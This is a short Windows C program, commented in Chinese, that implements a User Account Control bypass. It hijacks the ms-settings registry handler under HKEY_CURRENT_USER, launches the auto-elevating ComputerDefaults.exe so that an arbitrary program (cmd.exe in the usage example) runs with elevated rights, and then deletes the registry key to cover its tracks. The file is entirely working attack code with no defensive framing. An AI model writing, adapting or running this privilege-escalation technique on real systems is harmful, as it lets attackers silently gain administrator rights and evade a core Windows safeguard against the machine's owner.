#include <stdio.h>
#include <Windows.h>

int wmain(int argc, wchar_t* argv[]) {
    if (argc != 2) {
        wprintf(L"Usage: %s <filePath>\n", argv[0]);
        wprintf(L"       %s cmd.exe\n", argv[0]);
        exit(1);
    }

    LPWSTR filePath = argv[1];

    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFOA si = { 0 };
    HKEY hKey;

    si.cb = sizeof(STARTUPINFO);
    si.wShowWindow = SW_HIDE;
    RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\Shell\\open\\command", &hKey);       // 创建注册表项
    RegSetValueExW(hKey, L"", 0, REG_SZ, (LPBYTE)filePath, lstrlenW(filePath));                             // 赋值，执行的exe路径
    RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, (LPBYTE)"", sizeof(""));
    // 创建进程ComputerDefaults
    CreateProcessA("C:\\Windows\\System32\\cmd.exe", (LPSTR)"/c C:\\Windows\\System32\\ComputerDefaults.exe", NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);

    // 延时十秒，等ComputerDefaults.exe运行
    Sleep(10000);
    // 清楚注册表项
    RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");

    return 0;
}